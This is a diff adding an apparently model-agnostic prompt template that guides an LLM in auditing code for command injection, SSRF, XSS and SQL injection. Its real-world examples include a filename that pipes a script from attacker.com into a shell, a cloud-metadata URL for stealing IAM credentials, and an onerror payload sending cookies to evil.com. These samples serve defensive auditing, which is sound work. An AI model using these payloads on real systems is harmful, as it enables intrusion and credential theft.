@@ -1,0 +1,103 @@
+# Injection Vectors Audit Prompt
+# Model-agnostic: works with any LLM (Claude, GPT, GLM, Llama, Ollama).
+# Standard Markdown format, no model-specific features.
+
+schema_version: "1.0"
+kind: PromptTemplate
+id: injection
+name: "Injection Vectors Audit"
+description: "Audit for command injection, URL injection (SSRF), and content injection (XSS)"
+
+pattern_refs:
+  - "injection/command-injection"
+  - "injection/url-injection"
+  - "injection/content-injection"
+
+prompt: |
+  Analyze the following code for injection vulnerabilities. Injection occurs
+  when untrusted data is sent to an interpreter as part of a command or query.
+  The attacker's data tricks the interpreter into executing unintended commands
+  or accessing data without authorization.
+
+  ## Patterns to Check
+
+  ### 1. Command Injection [CRITICAL]
+
+  Look for user-controlled input flowing into OS command execution functions.
+
+  Red flags:
+  - `exec.Command()` with arguments from request parameters
+  - `child_process.exec()` with string concatenation or template literals
+  - `subprocess.call(..., shell=True)` with user input in the command string
+  - `os.system()` with any user-controlled component
+  - Shell metacharacters not stripped: `;`, `|`, `&&`, `$()`, backticks
+  - Filename arguments from user input (path traversal + command injection combo)
+
+  Real-world example: FFmpeg wrapper built command string from user-uploaded
+  filename: `exec("ffmpeg -i " + filename + " output.mp4")`. Attacker uploaded
+  file named `; curl attacker.com/shell.sh | sh ;.mp4`, achieving RCE.
+
+  Safe patterns to recognize (not vulnerable):
+  - `exec.Command("/usr/bin/ffmpeg", "-i", inputPath)` -- argument array, no shell
+  - `execFile` with explicit argument list
+  - `subprocess.run([...], shell=False)` -- list form without shell
+
+  ### 2. URL Injection / SSRF [HIGH]
+
+  Look for user-controlled input used to construct URLs for server-side requests.
+
+  Red flags:
+  - `http.Get(userProvidedURL)` without host allowlist validation
+  - `fetch(req.query.url)` or `axios.get(req.body.callback_url)`
+  - URL construction via string concatenation with user input
+  - Redirect URLs from user input without validation (`Location` header)
+  - Webhook callback URLs stored from user input and fetched later
+  - Internal service URLs constructed from user-controlled hostname/port
+
+  Attack vectors:
+  - Cloud metadata: `http://169.254.169.254/latest/meta-data/iam/`
+  - Internal services: `http://localhost:6379/` (Redis), `http://internal-api:8080/`
+  - DNS rebinding: attacker DNS resolves to public IP first, then internal IP
+  - Protocol smuggling: `gopher://`, `file://`, `dict://`
+
+  Real-world example: SMS service accepted a callback URL in the API request.
+  Attacker set callback to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+  and received AWS IAM credentials in the webhook response.
+
+  ### 3. Content Injection / XSS [HIGH]
+
+  Look for user-controlled content rendered into HTML without sanitization.
+
+  Red flags:
+  - `innerHTML = userContent` without DOMPurify sanitization
+  - `dangerouslySetInnerHTML={{ __html: userContent }}` in React
+  - `template.HTML(userInput)` in Go templates (bypasses auto-escaping)
+  - `| safe` filter in Jinja2/Django templates on user content
+  - `Markup(user_input)` in Flask
+  - JSON responses with `Content-Type: text/html` containing user data
+  - SVG uploads rendered inline (SVG can contain `<script>` tags)
+  - Markdown rendering without sanitization of HTML blocks
+
+  Attack impact:
+  - Session hijacking via stolen cookies
+  - Credential theft via fake login forms
+  - Cryptocurrency mining in victim's browser
+  - Keylogging and form data exfiltration
+  - Defacement and phishing
+
+  Real-world example: Notification system rendered user-provided message body
+  via `innerHTML`. Attacker sent a notification containing
+  `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`,
+  stealing session tokens from every user who viewed the notification.
+
+  ## SQL Injection (Bonus Check)
+
+  While not a separate pattern category, also look for:
+  - String concatenation in SQL queries: `"SELECT * FROM users WHERE id=" + id`
+  - `fmt.Sprintf` used to build SQL: `fmt.Sprintf("WHERE name = '%s'", name)`
+  - Raw queries without parameterized placeholders
+  - ORM `raw()` or `execute()` with string interpolation
+
+  ## Code to Analyze
+
+  {code_context}
